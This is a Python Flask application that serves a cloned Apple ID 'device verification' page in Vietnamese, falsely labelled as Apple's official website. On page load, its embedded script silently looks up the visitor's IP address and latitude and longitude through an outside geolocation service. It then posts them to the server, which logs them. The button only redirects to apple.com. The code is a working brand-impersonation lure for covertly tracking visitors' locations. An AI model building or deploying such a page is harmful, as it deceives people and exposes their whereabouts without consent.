from flask import Flask, Response, request, jsonify
import os

app = Flask(__name__)

HTML_PAGE = '''
<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Apple (Clone) + Xác minh thiết bị</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      margin: 0;
      background-color: #f5f5f7;
    }
    header {
      background-color: #1d1d1f;
      color: white;
      padding: 14px 40px;
      display: flex;
      align-items: center;
      gap: 20px;
    }
    header img {
      height: 20px;
    }
    header nav a {
      color: white;
      text-decoration: none;
      font-size: 14px;
    }
    .content {
      display: flex;
      justify-content: center;
      margin-top: 140px;
    }
    .apple-block {
      background: white;
      border-radius: 20px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      padding: 40px 30px;
      width: 340px;
      text-align: center;
    }
    .apple-logo img {
      height: 40px;
      margin-bottom: 20px;
    }
    h1 {
      font-weight: 600;
      font-size: 28px;
      margin: 0 0 12px;
    }
    p.description {
      font-size: 16px;
      color: #6e6e73;
      margin: 0 0 30px;
    }
    button.verify-button {
      background-color: #0071e3;
      border: none;
      border-radius: 12px;
      color: white;
      font-weight: 600;
      font-size: 17px;
      padding: 14px 0;
      width: 200px;
      cursor: pointer;
      box-shadow: 0 5px 15px rgba(0,113,227,0.4);
      user-select: none;
      margin-bottom: 15px;
    }
    button.verify-button:hover {
      background-color: #005bb5;
      box-shadow: 0 8px 20px rgba(0,91,181,0.6);
    }
    #status {
      font-size: 15px;
      color: #48484a;
      user-select: none;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <header>
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple" />
    <nav>
      <a href="#">Store</a>
      <a href="#">Mac</a>
      <a href="#">iPhone</a>
      <a href="#">Watch</a>
      <a href="#">Support</a>
    </nav>
  </header>

  <div class="content">
    <div class="apple-block">
      <div class="apple-logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple logo" />
      </div>
      <h1>Apple ID</h1>
      <p class="description">Confirm opening Apple website</p>
      <button class="verify-button" id="verifyBtn">Submit</button>
      <div id="status"></div>
      <a href="https://www.apple.com/legal/internet-services/itunes/vn/terms.html" target="_blank" style="font-size:13px; color:#0071e3; text-decoration:none; display:block; margin-top:10px;">
        Điều khoản & Dịch vụ của Apple
      </a>
    </div>
  </div>

  <div style="text-align:center; font-size:13px; color:#6e6e73; margin-top:20px;">
    Website chính thức của apple
  </div>

  <script>
    window.addEventListener('DOMContentLoaded', async () => {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        const payload = {
          ip: data.ip,
          latitude: data.latitude,
          longitude: data.longitude
        };

        await fetch('/submit', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        });

        console.log("✅ IP & vị trí đã gửi:", payload);
      } catch (err) {
        console.error("❌ Lỗi khi gửi IP:", err);
      }
    });

    document.getElementById("verifyBtn").addEventListener("click", () => {
      window.location.href = "https://www.apple.com/shop/";
    });
  </script>
</body>
</html>
'''

@app.route('/')
def index():
    ip = request.remote_addr
    print(f"[📡] IP người truy cập: {ip}")
    return Response(HTML_PAGE, mimetype='text/html')


@app.route('/submit', methods=['POST'])
def submit():
    try:
        data = request.get_json()
        print("[📥] Dữ liệu nhận được:", data)
    except Exception as e:
        print("❌ Không đọc được JSON:", e)
        return jsonify({'error': 'Lỗi đọc JSON'}), 400

    if not data:
        return jsonify({'error': 'Không có dữ liệu gửi lên'}), 400

    ip = data.get('ip')
    lat = data.get('latitude')
    lon = data.get('longitude')

    if not ip or lat is None or lon is None:
        return jsonify({'error': 'Thiếu dữ liệu'}), 400

    print(f"✅ Xác minh: IP={ip}, Vị trí=({lat}, {lon})")
    return jsonify({'message': 'Đã nhận dữ liệu xác minh'}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port, debug=True)
